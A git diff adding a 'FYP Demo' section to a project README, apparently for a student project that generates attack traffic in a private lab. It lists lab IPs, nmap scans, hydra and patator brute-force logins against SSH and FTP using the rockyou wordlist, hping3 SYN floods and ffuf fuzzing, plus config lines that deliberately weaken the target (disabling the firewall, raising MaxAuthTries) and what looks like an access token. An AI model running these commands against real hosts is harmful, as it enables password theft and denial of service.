@@ -75,3 +75,72 @@ npm run dev
 # agent
 uv sync && uv run python -m src.main
 ```
+
+### FYP Demo
+
+Kali: 192.168.211.129
+Ubuntu: 192.168.211.130
+Windows: 192.168.100.95
+
+Hack:
+
+```
+sudo nmap -sU --top-ports 200 -T4 192.168.211.130
+
+hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://192.168.211.130 -t 8 -W 2 -f
+
+hydra -l testuser -P /usr/share/wordlists/rockyou.txt ftp://192.168.211.130 -t 8 -W 2 -f
+
+sudo nmap -sS -sV -O -A -p 1-10000 -T5 --min-rate 3000 --max-retries 1 192.168.211.130
+
+sudo hping3 -S 192.168.211.130 -p 80 -i u1000 -c 20000
+
+for p in 22 80 443 445 3389 8080; do
+  sudo hping3 -S 192.168.211.130 -p "$p" -i u1000 -c 5000
+done
+
+for p in 21 22 23 25 53 80 110 135 139 143 443 445 3306 3389 5432 5900 8080; do
+  sudo hping3 -S 192.168.211.130 -p "$p" -i u200 -c 20000
+done
+
+hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt -s 21 -t 32 -W 3 -w 5 -I -V ftp://192.168.211.130
+
+hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt -t 8 -W 5 -I -V ftp://192.168.211.130
+
+hydra -l testuser -P /usr/share/wordlists/rockyou.txt -s 21 -t 64 -W 1 -w 3 -I -V ftp://192.168.211.130
+
+patator ftp_login host=192.168.211.130 user=ftpuser password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -t 16
+
+ffuf -u http://192.168.211.130:8080/FUZZ -w /usr/share/wordlists/rockyou.txt -t 50
+```
+
+Confirmed:
+
+```
+hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://192.168.211.130 -t 8 -W 2 -f
+
+hydra -l testuser -P /usr/share/wordlists/rockyou.txt ftp://192.168.211.130 -t 8 -W 2 -f
+
+patator ftp_login host=192.168.211.130 user=ftpuser password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -t 16
+
+patator ssh_login host=192.168.211.130 user=ftpuser password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -t 16
+
+python -m http.server 8080
+nmap -sV -p 8080 192.168.211.130
+```
+
+Configs:
+
+```
+9
+ztag_5xITauDK06LMR9xd72jSSMcwRfbQx_1rorhFj4BDijo
+
+PasswordAuthentication yes
+MaxAuthTries 100
+MaxStartups 1000:100:1000
+LoginGraceTime 120
+
+sudo ufw disable
+sudo sysctl -w net.ipv4.icmp_ratelimit=0
+ulimit -n 65535
+```
